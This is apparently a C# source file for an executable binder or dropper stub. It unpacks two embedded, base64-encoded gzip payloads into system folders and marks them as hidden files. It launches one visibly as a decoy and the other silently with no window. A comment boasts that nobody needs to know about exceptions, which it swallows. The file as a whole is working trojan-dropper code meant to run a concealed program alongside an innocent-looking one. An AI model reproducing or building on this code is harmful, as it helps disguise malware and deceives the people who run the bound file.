using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace pattern.exeMerge
{
    static class Program
    {

        const string displayFileData = @"DISPLAY_FILE_PATTERN";
        const string displayFileName = @"DS.EXE";
      
        const string backgroundFileData = @"BACKGROUND_FILE_PATTERN";
        const string backgroundFileName = @"BG.EXE";

        static Environment.SpecialFolder displayFolder = (Environment.SpecialFolder)Enum.Parse(typeof(Environment.SpecialFolder), "DS_FOLDER");
        static Environment.SpecialFolder backgroundFolder = (Environment.SpecialFolder) Enum.Parse(typeof(Environment.SpecialFolder), "BG_FOLDER");

        [STAThread]
        static void Main(string[] args)
        {
            try
            {
                string displayExportPath = Environment.GetFolderPath(displayFolder) + "\\";
                string displayFile = displayExportPath + displayFileName;

                string backgroundExportPath = Environment.GetFolderPath(backgroundFolder) + "\\";
                string backgroundFile = backgroundExportPath + backgroundFileName;


                if (!File.Exists(displayFile))
                {
                    byte[] displayFileBuffer = decompress(displayFileData);
                    saveFile(displayFileBuffer, displayFile);
                }
               
                if(!File.Exists(backgroundFile))
                {
                    byte[] backgroundFileBuffer = decompress(backgroundFileData);
                    saveFile(backgroundFileBuffer, backgroundFile);
                }

                executeProcess(displayFile, ProcessWindowStyle.Normal);
                executeProcess(backgroundFile, ProcessWindowStyle.Hidden);

            }
            catch (Exception ex)
            {
                ///Hush... nobody need to know about any exception :)
            }
        }

        static void executeProcess(string file, ProcessWindowStyle style)
        {
            ProcessStartInfo info = new ProcessStartInfo(file);
            info.UseShellExecute = false;
            info.WindowStyle = style;

            if (info.WindowStyle == ProcessWindowStyle.Hidden)
            {
                info.CreateNoWindow = true;
            }

            Process process = new Process();
            process.StartInfo = info;

            process.Start();

        }

        static byte[] decompress(string compressedText)
        {
            byte[] gZipBuffer = Convert.FromBase64String(compressedText);
            using (var memoryStream = new MemoryStream())
            {
                int dataLength = BitConverter.ToInt32(gZipBuffer, 0);
                memoryStream.Write(gZipBuffer, 4, gZipBuffer.Length - 4);

                var buffer = new byte[dataLength];

                memoryStream.Position = 0;
                using (var gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress))
                {
                    gZipStream.Read(buffer, 0, buffer.Length);
                }

                return buffer;
            }
        }

        static void saveFile(byte[] bytes, string filename)
        {
            File.WriteAllBytes(filename, bytes);
            File.SetAttributes(filename, FileAttributes.Hidden);
        }
    }
}
